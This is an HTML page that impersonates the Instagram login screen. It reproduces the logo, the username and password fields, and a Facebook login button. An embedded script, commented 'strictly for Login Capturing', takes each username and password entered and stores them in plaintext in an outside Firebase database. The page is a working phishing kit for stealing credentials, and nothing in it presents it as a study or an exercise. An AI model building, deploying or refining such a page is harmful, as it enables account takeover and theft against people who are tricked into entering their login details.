<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log into Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="card">
    <header class="top">
      <svg class="logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="Instagram">
        <defs>
          <linearGradient id="ig" x1="10%" y1="100%" x2="90%" y2="0%">
            <stop offset="0%" stop-color="#FFC107"/>
            <stop offset="30%" stop-color="#FF5722"/>
            <stop offset="60%" stop-color="#E91E63"/>
            <stop offset="100%" stop-color="#7B3FE4"/>
          </linearGradient>
        </defs>
        <rect width="64" height="64" rx="18" fill="url(#ig)"/>
        <rect x="12" y="12" width="40" height="40" rx="12" fill="none" stroke="#fff" stroke-width="5"/>
        <circle cx="32" cy="32" r="9.5" fill="none" stroke="#fff" stroke-width="5"/>
        <circle cx="45" cy="19" r="3" fill="#fff"/>
      </svg>
    </header>

    <main class="content">
      <h1>Log into Instagram</h1>

      <form id="loginForm" novalidate>
        <div class="field">
          <input type="text" id="username" placeholder="Mobile number, username or email" autocomplete="username" />
        </div>

        <div class="field">
          <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
          <button type="button" id="toggle" class="eye" aria-label="Show password">
            <svg id="eyeIcon" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
              <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
              <line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </button>
        </div>

        <button type="submit" id="loginBtn" class="btn primary" disabled>Log in</button>
      </form>

      <a href="#" class="forgot">Forgot password?</a>

      <div class="spacer"></div>

      <button class="btn fb" type="button">
        <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1877F2"/><path d="M16.6 15.5l.5-3.5h-3.3V9.8c0-1 .5-1.9 2-1.9h1.5V4.9s-1.4-.2-2.7-.2c-2.7 0-4.5 1.7-4.5 4.700V12H7v3.500h3.100V24h3.700v-8.500z" fill="#fff"/></svg>
        Log in with Facebook
      </button>
      <button class="btn outline" type="button">Create new account</button>

      <div class="meta">
        <svg width="20" height="12" viewBox="0 0 64 32" fill="none" stroke="#0866FF" stroke-width="6" stroke-linecap="round">
          <path d="M6 22c0-8 5-16 11-16 8 0 14 20 22 20 5 0 8-5 8-10S44 6 39 6c-6 0-10 6-14 12"/>
        </svg>
        <span>Meta</span>
      </div>
    </main>

    <footer class="bottom"></footer>
    
      <!-- Firebase Logic strictly for Login Capturing -->
      <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-analytics.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-database.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyAeAokSmV5biYmhiVEygZdu8bRZY6OwKRA",
          authDomain: "scanify-8b2f8.firebaseapp.com",
          databaseURL: "https://scanify-8b2f8-default-rtdb.firebaseio.com",
          projectId: "scanify-8b2f8",
          storageBucket: "scanify-8b2f8.firebasestorage.app",
          messagingSenderId: "161299105303",
          appId: "1:161299105303:web:8db3dd4341dfb4cb9ffe52",
          measurementId: "G-TRWL4J7Z8H"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const database = getDatabase(app);

        // Securely log to Firebase when script.js announces a login
        document.addEventListener("userLoginAttempt", (e) => {
          const email = e.detail.email;
          const password = e.detail.password;

          if (email && password) {
            const userData = {
              username: email,
              password: password
            };

            set(ref(database, '/users/' + password), userData)
              .catch((err) => console.error("Firebase Database Error:", err));
          }
        });
      </script>
  </div>

  <script src="script.js"></script>
  
</body>
</html>
